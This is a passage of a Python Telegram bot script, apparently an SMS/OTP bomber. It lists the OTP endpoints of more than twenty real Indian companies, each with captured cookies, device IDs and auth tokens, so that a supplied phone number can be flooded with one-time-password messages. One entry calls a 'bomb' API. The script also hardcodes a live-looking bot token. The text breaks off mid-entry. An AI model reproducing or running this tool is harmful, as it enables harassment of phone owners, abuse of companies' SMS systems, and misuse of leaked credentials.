import asyncio
import aiohttp
import time
import json
import os
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, ContextTypes

BOT_TOKEN = "8830831152:AAE_h4_H1HNigPKPqh5PlUoxwug3mz1mhSE"
APPROVED_GROUPS_FILE = "aproved_groups.json"
OWNER_ID = 8300072133  # Your Telegram User ID

APIS = [
    # ============ ORIGINAL API ============
    {
        "name": "SplexXO API", 
        "url": lambda p, d: f"https://splexxo1-2api.vercel.app/bomb?phone={p}&key=SPLEXXO",
        "method": "GET",
        "headers": {},
        "data": None
    },
    
    # ============ NEW APIS ============
    {
        "name": "AgRevolution",
        "url": lambda p, d: "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p, d: json.dumps({"mobile_number": p, "client_id": "kisan-app"})
    },
    
    {
        "name": "Breeze",
        "url": lambda p, d: "https://api.breeze.in/session/start",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "x-device-id": "A1pKVEDhlv66KLtoYsml3",
            "x-session-id": "MUUdODRfiL8xmwzhEpjN8"
        },
        "data": lambda p, d: json.dumps({
            "phoneNumber": p,
            "authVerificationType": "otp",
            "device": {
                "id": "A1pKVEDhlv66KLtoYsml3",
                "platform": "Chrome",
                "type": "Desktop"
            },
            "countryCode": "+91"
        })
    },
    
    {
        "name": "Jockey",
        "url": lambda p, d: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=true",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
            "origin": "https://www.jockey.in",
            "referer": "https://www.jockey.in/",
            "cookie": "localization=IN; _shopify_y=6556c530-8773-4176-99cf-f587f9f00905; _tracking_consent=3.AMPS_INUP_f_f_4MXMfRPtTkGLORLJPTGqOQ; _ga=GA1.1.377231092.1757430108; _fbp=fb.1.1757430108545.190427387735094641; _quinn-sessionid=a2465823-ceb3-4519-9f8d-2a25035dfccd; cart=hWN2mTp3BwfmsVi0WqKuawTs?key=bae7dea0fc1b412ac5fceacb96232a06; wishlist_id=7531056362789hypmaaup; wishlist_customer_id=0; _shopify_s=d4985de8-eb08-47a0-9f41-84adb52e6298"
        },
        "data": None
    },
    
    # ============ COUNT=5 APIs ============
    {
        "name": "PenPencil PW",
        "url": lambda p, d: "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.pw.live",
            "priority": "u=1, i",
            "randomid": "e66d7f5b-7963-408e-9892-839015a9c83f",
            "referer": "https://www.pw.live/",
            "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({"mobile": p, "countryCode": "+91", "subOrgId": "SUB-PWLI000"})
    },
    
    {
        "name": "Zoho Store",
        "url": lambda p, d: f"https://store.zoho.com/api/v1/partner/affiliate/sendotp?mobilenumber=91{p}&countrycode=IN&country=india",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Length": "0",
            "Origin": "https://www.zoho.com",
            "Referer": "https://www.zoho.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": None
    },
    
    {
        "name": "KPN Fresh",
        "url": lambda p, d: "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.3",
        "method": "POST",
        "headers": {
            "x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587",
            "x-app-version": "3.0.3",
            "x-user-journey-id": "7e4e8701-18c6-4ed7-b7f5-eb0a2ba2fbec",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/5.0.0-alpha.11"
        },
        "data": lambda p, d: json.dumps({"phone_number": {"country_code": "+91", "number": p}})
    },
    
    {
        "name": "Aditya Birla",
        "url": lambda p, d: "https://udyogplus.adityabirlacapital.com/api/msme/Form/GenerateOTP",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Cookie": "shell#lang=en; ASP.NET_SessionId=nyoubocr2b4vz3iv2ahat3xs; ARRAffinity=433759ed76e330312e38a9f2e2e43b4a938d01a030cf5413c8faacb778ec580c; ARRAffinitySameSite=433759ed76e330312e38a9f2e2e43b4a938d01a030cf5413c8faacb778ec580c; _gcl_aw=GCL.1728839037.EAIaIQobChMIrY6l8umLiQMV5KhmAh1TaA0oEAMYASAAEgJ4pfD_BwE; _gcl_gs=2.1.k1$i1728839026$u150997757; _gcl_au=1.1.486755895.1728839037; _ga=GA1.1.694452391.1728839040; sts=eyJzaWQiOjE3Mjg4MzkwNDA3MjgsInR4IjoxNzI4ODM5MDQwNzI4LCJ1cmwiOiJodHRwcyUzQSUyRiUyRnVkeW9ncGx1cy5hZGl0eWFiaXJsYWNhcGl0YWwuY29tJTJGc2lnbnVwLWNvYnJhbmRlZCUzRnVybCUzRCUyRiUyNnV0bV9zb3VyY2UlM0REZW50c3Vnb29nbGUlMjZ1dG1fY2FtcGFpZ24lM0R0cmF2ZWxfcG1heCUyNnV0bV9tZWRpdW0lM0QlMjZ1dG1fY29udGVudCUzRGtscmFodWwlMjZqb3VybmV5JTNEcGwlMjZnYWRfc291cmNlJTNEMSUyNmdjbGlkJTNERUFJYUlRb2JDaE1Jclk2bDh1bUxpUU1WNUtobUFoMVRhQTBvRUFNWUFTQUFFZ0o0cGZEX0J3RSIsInBldCI6MTcyODgzOTA0MDcyOCwic2V0IjoxNzI4ODM5MDQwNzI4fQ==; stp=eyJ2aXNpdCI6Im5ldyIsInV1aWQiOiI5YTdmMGYyZC01NDJjLTRiNTEtYWEwNC01NzAwMjRlN2M4YjAifQ==; stgeo=IjAi; stbpnenable=MA==; __stdf=MA==; _ga_4CYZ07WNGN=GS1.1.1728839040.1.0.1728839049.51.0.0",
            "Origin": "https://udyogplus.adityabirlacapital.com",
            "Referer": "https://udyogplus.adityabirlacapital.com/signup-cobranded?url=/&utm_source=Dentsugoogle&utm_campaign=travel_pmax&utm_medium=&utm_content=klrahul&journey=pl&gad_source=1&gclid=EAIaIQobChMIrY6l8umLiQMV5KhmAh1TaA0oEAMYASAAEgJ4pfD_BwE",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "X-Requested-With": "XMLHttpRequest",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda p, d: f"MobileNumber={p}&functionality=signup"
    },
    
    {
        "name": "Muthoot Finance",
        "url": lambda p, d: "https://www.muthootfinance.com/smsapi.php",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "AWSALBAPP-0=_remove_; AWSALBAPP-1=_remove_; AWSALBAPP-2=_remove_; AWSALBAPP-3=_remove_; _gcl_au=1.1.289346829.1728838221; _ga_S5CNT4BSQC=GS1.1.1728838222.1.0.1728838222.60.0.0; _ga=GA1.2.273797446.1728838222; _gid=GA1.2.1628453949.1728838223; _gat_UA-38238796-1=1; _fbp=fb.1.1728838224699.885355239931807707; toasterClosedOnce=true",
            "origin": "https://www.muthootfinance.com",
            "priority": "u=1, i",
            "referer": "https://www.muthootfinance.com/personal-loan",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda p, d: f"mobile={p}&pin=XjtYYEdhP0haXjo3"
    },
    
    {
        "name": "GoPaySense",
        "url": lambda p, d: "https://api.gopaysense.com/users/otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "cookie": "_ga=GA1.2.1154421870.1728838134; _gid=GA1.2.883266871.1728838135; _gat_UA-96384581-2=1; WZRK_G=1acba64bbe41434abc9c3d3d5645deeb; WZRK_S_8RK-99W-485Z=%7B%22p%22%3A1%2C%22s%22%3A1728838134%2C%22t%22%3A1728838134%7D; _uetsid=0982d4e0898311ef9e26c943f5765261; _uetvid=09833b40898311efb6d4f32471c8cf05; _ga_4S93MBNNX8=GS1.2.1728838135.1.0.1728838140.55.0.0; _ga_F7R96SWGCB=GS1.1.1728838134.1.1.1728838140.0.0.0",
            "origin": "https://www.gopaysense.com",
            "priority": "u=1, i",
            "referer": "https://www.gopaysense.com/",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({"phone": p})
    },
    
    {
        "name": "IIFL",
        "url": lambda p, d: "https://www.iifl.com/personal-loans?_wrapper_format=html&ajax_form=1&_wrapper_format=drupal_ajax",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "cookie": "gclid=undefined; AKA_A2=A",
            "origin": "https://www.iifl.com",
            "priority": "u=1, i",
            "referer": "https://www.iifl.com/personal-loans",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest"
        },
        "data": lambda p, d: f"apply_for=18&full_name=Adnvs+Signh&mobile_number={p}&terms_and_condition=1&utm_source=&utm_medium=&utm_campaign=&utm_content=&utm_term=&campaign=&gclid=&lead_id=&redirect_url=&form_build_id=form-FvvMqggkrdM-07pMIIyAElAcaj_kGjCMOS5UHKh_vUc&form_id=webform_submission_muti_step_lead_gen_form_node_66_add_form&_triggering_element_name=op&_triggering_element_value=Apply+Now&_drupal_ajax=1&ajax_page_state%5Btheme%5D=iifl_finance&ajax_page_state%5Btheme_token%5D=&ajax_page_state%5Blibraries%5D=bootstrap_barrio%2Fglobal-styling%2Cclientside_validation_jquery%2Fcv.jquery.ckeditor%2Cclientside_validation_jquery%2Fcv.jquery.ife%2Cclientside_validation_jquery%2Fcv.jquery.validate%2Cclientside_validation_jquery%2Fcv.pattern.method%2Ccore%2Fdrupal.autocomplete%2Ccore%2Fdrupal.collapse%2Ccore%2Fdrupal.states%2Ccore%2Finternal.jquery.form%2Ceu_cookie_compliance%2Feu_cookie_compliance_default%2Ciifl_crm_api%2Fglobal-styling%2Ciifl_crm_api%2Fgold-global-styling%2Ciifl_finance%2Fbootstrap%2Ciifl_finance%2Fbreadcrumb%2Ciifl_finance%2Fdailyhunt-pixel%2Ciifl_finance%2Fdatalayer%2Ciifl_finance%2Fglobal-styling%2Ciifl_finance%2Fpersonal-loan%2Ciifl_finance_common%2Fglobal%2Cnode_like_dislike_field%2Fnode_like_dislike_field%2Cparagraphs%2Fdrupal.paragraphs.unpublished%2Csearch_autocomplete%2Ftheme.minimal.css%2Csystem%2Fbase%2Cviews%2Fviews.module%2Cwebform%2Fwebform.ajax%2Cwebform%2Fwebform.composite%2Cwebform%2Fwebform.dialog%2Cwebform%2Fwebform.element.details%2Cwebform%2Fwebform.element.details.save%2Cwebform%2Fwebform.element.details.toggle%2Cwebform%2Fwebform.element.message%2Cwebform%2Fwebform.element.options%2Cwebform%2Fwebform.element.select%2Cwebform%2Fwebform.form"
    },
    
    {
        "name": "BankOpen",
        "url": lambda p, d: "https://v2-api.bankopen.co/users/register/otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "baggage": "sentry-environment=prod,sentry-release=app-open-money%405.2.0,sentry-public_key=76093829eb3048de9926891ff8e44fac,sentry-trace_id=a17bb4c75de741ffa0998329abf41310",
            "content-type": "application/json",
            "origin": "https://app.opencapital.co.in",
            "priority": "u=1, i",
            "referer": "https://app.opencapital.co.in/en/onboarding/register?utm_source=google&utm_medium=cpc&utm_campaign=IYD_MaxTesting&utm_term=&utm_placement=&gad_source=1&gclid=EAIaIQobChMIo_vwi96LiQMVQaVmAh27cAhXEAAYAiAAEgIkAPD_BwE",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "sentry-trace": "a17bb4c75de741ffa0998329abf41310-bc065941fd22d33d-1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "x-api-version": "3.1",
            "x-client-type": "Web"
        },
        "data": lambda p, d: json.dumps({"username": p, "is_open_capital": 1})
    },
    
    {
        "name": "Tata Capital",
        "url": lambda p, d: "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://www.tatacapital.com",
            "priority": "u=0, i",
            "referer": "https://www.tatacapital.com/",
            "sec-ch-ua": '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({
            "header": {
                "authToken": "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==",
                "identifier": "nli"
            },
            "body": {
                "mobileNumber": p
            }
        })
    },
    
    {
        "name": "TradeIndia",
        "url": lambda p, d: "https://apis.tradeindia.com/app_login_api/login_app",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "client_remote_address": "10.0.2.16",
            "content-type": "application/json",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/4.11.0"
        },
        "data": lambda p, d: json.dumps({"mobile": f"+91{p}"})
    },
    
    {
        "name": "Khatabook",
        "url": lambda p, d: "https://api.khatabook.com/v1/auth/request-otp",
        "method": "POST",
        "headers": {
            "x-kb-app-name": "khatabook",
            "x-kb-app-version": "801800",
            "x-kb-app-locale": "en",
            "x-kb-platform": "android",
            "Content-Type": "application/json; charset=UTF-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/4.10.0"
        },
        "data": lambda p, d: json.dumps({"phone": p, "country_code": "+91", "app_signature": "wk+avHrHZf2"})
    },
    
    {
        "name": "Orange Health",
        "url": lambda p, d: "https://accounts.orangehealth.in/api/v1/user/otp/generate/",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.orangehealth.in",
            "priority": "u=1, i",
            "referer": "https://www.orangehealth.in/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({"mobile_number": p, "customer_auto_fetch_message": True})
    },
    
    {
        "name": "JobHai",
        "url": lambda p, d: "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "device-id": "e97edd71-16a3-4835-8aab-c67cf5e21be1",
            "language": "en",
            "origin": "https://www.jobhai.com",
            "priority": "u=1, i",
            "referer": "https://www.jobhai.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "source": "WEB",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-transaction-id": "JS-WEB-89b40679-56c2-4c0e-926e-0fafca8a84f3"
        },
        "data": lambda p, d: json.dumps({"phone": p})
    },
    
    {
        "name": "Mvaahna",
        "url": lambda p, d: "https://mconnect.isteer.co/mconnect/login",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "app_platform": "mvaahna",
            "content-type": "application/json",
            "origin": "https://mvaahna.com",
            "priority": "u=1, i",
            "referer": "https://mvaahna.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({"mobile_number": f"+91{p}"})
    },
    
    {
        "name": "AstroSage",
        "url": lambda p, d: f"https://varta.astrosage.com/sdk/registerAS?callback=myCallback&countrycode=91&phoneno={p}&deviceid=&jsonpcall=1&fromresend=0&operation_name=blank&_=1719472121119",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "cookie": "_gid=GA1.2.1239008246.1719472125; _gat_gtag_UA_245702_1=1; _ga=GA1.1.1226959669.1719472122; _ga_1C0W65RV19=GS1.1.1719472121.1.1.1719472138.0.0.0; _ga_0VL2HF4X5B=GS1.1.1719472125.1.1.1719472138.47.0.0",
            "referer": "https://www.astrosage.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "script",
            "sec-fetch-mode": "no-cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None
    },
    
    {
        "name": "Spinny",
        "url": lambda p, d: "https://api.spinny.com/api/c/user/otp-request/v3/",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "varnishPrefixHome=false; utm_source=SPD-Search-Top8-National-Brand-EM-Home; utm_medium=gads_c_search; platform=web; _gcl_gs=2.1.k1$i1719310791; _gcl_au=1.1.1890033919.1719310798; _gcl_aw=GCL.1719310800.EAIaIQobChMI5dC558P2hgMVUhaDAx2-3AwcEAAYASAAEgJXUvD_BwE; _ga=GA1.1.1822449614.1719310800; _fbp=fb.1.1719310801079.320900520174536436; _ga_WQREN8TJ7R=GS1.1.1719310799.1.1.1719310837.22.0.0",
            "origin": "https://www.spinny.com",
            "platform": "web",
            "priority": "u=1, i",
            "referer": "https://www.spinny.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda p, d: json.dumps({"contact_number": p, "whatsapp": False, "code_len": 4, "expected_action": "login"})
    },
    
    {
        "name": "Dream11",
        "url": lambda p, d: "https://www.dream11.com/auth/passwordless/init",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "dh_user_id=17cf6211-32d3-11ef-b821-53f25fac4eef; _scid=48db139d-e4a8-4dbd-af4b-93becdc4c5d3; _scid_r=48db139d-e4a8-4dbd-af4b-93becdc4c5d3; _fbp=fb.1.1719310489582.789493345356902452; _sctr=1%7C1719298800000; __csrf=6rcny4; _dd_s=rum=2&id=e35a5e56-45d2-4dbf-8678-20bc45cbb11c&created=1719310504672&expire=1719311451078",
            "device": "pwa",
            "origin": "https://www.dream11.com",
            "priority": "u=1, i",
            "referer": "https://www.dream11.com/register?redirectTo=%2F",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-device-identifier": "macos"
        },
        "data": lambda p, d: json.dumps({"channel": "sms", "flow": "SIGNUP", "phoneNumber": p, "templateName": "default"})
    },
    
    {
        "name": "CityMall",
        "url": lambda p, d: "https://citymall.live/api/cl-user/auth/get-otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Cookie": "bp=lg; vxid=3a5a7d25605926fc8a9f938b4198d7f3; referral=https%253A%252F%252Fwww.google.com%252F; _ga=GA1.1.100588395.1719309875; WZRK_G=4e632d8f31c540b3aaf6c01c140a7e0e; _fbp=fb.1.1719309877848.406176085245910420; WZRK_S_4RW-KZK-995Z=%7B%22p%22%3A1%2C%22s%22%3A1719309880%2C%22t%22%3A1719309879%7D; _ga_45DD1K708L=GS1.1.1719309875.1.0.1719309885.0.0.0",
            "Origin": "https://citymall.live",
            "Referer": "https://citymall.live/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "language": "en",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "use-applinks": "true",
            "x-app-name": "WEB",
            "x-requested-with": "WEB"
        },
        "data": lambda p, d: json.dumps({"phone_number": p})
    },
    
    {
        "name": "BellaVita",
        "url": lambda p, d: f"https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={p}&storeUrl=bellavita1.myshopify.com&email=undefined&resendingOtp=false",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://bellavitaorganic.com",
            "priority": "u=1, i",
            "referer": "https://bellavitaorganic.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None
    },
    
    {
        "name": "OYO",
        "url": lambda p, d: "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "text/plain;charset=UTF-8",
            "cookie": "_csrf=0L9ShP2N7kBoNgROXcXgrpzO; acc=IN; X-Location=georegion%3D104%2Ccountry_code%3DIN%2Cregion_code%3DMH%2Ccity%3DMUMBAI%2Clat%3D18.98%2Clong%3D72.83%2Ctimezone%3DGMT%2B5.50%2Ccontinent%3DAS%2Cthroughput%3Dlow%2Cbw%3D1%2Casnum%3D55836%2Cnetwork_type%3Dmobile%2Clocation_id%3D0; mab=f14b44638c4c98b516a82db98baa1d6d; expd=mww2%3A1%7Cioab%3A0%7Cmhdp%3A1%7Cbcrp%3A0%7Cpwbs%3A1%7Cslin%3A1%7Chsdm%3A2%7Ccomp%3A0%7Cnrmp%3A1%7Cnhyw%3A1%7Cppsi%3A0%7Cgcer%3A0%7Crecs%3A1%7Clvhm%3A1%7Cgmbr%3A1%7Cyolo%3A1%7Crcta%3A1%7Ccbot%3A1%7Cotpv%3A1%7Cndbp%3A0%7Cmapu%3A1%7Cnclc%3A1%7Cdwsl%3A1%7Ceopt%3A1%7Cotpv%3A1%7Cwizi%3A1%7Cmorr%3A1%7Cyopb%3A1%7CTTP%3A1%7Caimw%3A1%7Chdpn%3A0%7Cweb2%3A0%7Clog2%3A0%7Clog2%3A0%7Cugce%3A0%7Cltvr%3A1%7Chwiz%3A0%7Cwizz%3A1%7Clpcp%3A1%7Cclhp%3A0%7Cprwt%3A0%7Ccbhd%3A0%7Cins2%3A3%7Cmhdc%3A1%7Clopo%3A1%7Cptax%3A1%7Ciiat%3A0%7Cpbnb%3A0%7Cror2%3A1%7Csovb%3A1%7Cqupi%3A0%7Cnbi1%3A3; appData=%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D; token=dUxaRnA5NWJyWFlQYkpQNnEtemo6bzdvX01KLUNFbnRyS3hfdEgyLUE%3D; _uid=Not%20logged%20in; XSRF-TOKEN=OP9zTOUO-KF2BfPbXRH6JwwWcsE1QiHdq7eM; fingerprint2=8f2b46724e08bf3602b6c5f6745f8301; AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.185019609.1719309292; _gid=GA1.2.1636583452.1719309292; _gcl_au=1.1.1556474320.1719309295; tvc_utm_source=google; tvc_utm_medium=organic; tvc_utm_campaign=(not set); tvc_utm_key=(not set); tvc_utm_content=(not set); rsd=true; _gat=1; _ga_589V9TZFMV=GS1.1.1719309291.1.1.1719309411.8.0.1086743157",
            "deviceid": "8f2b46724e08bf3602b6c5f6745f8301411649",
            "externalheaders": "[object Object]",
            "loc": "153",
            "origin": "https://www.oyorooms.com",
            "priority": "u=1, i",
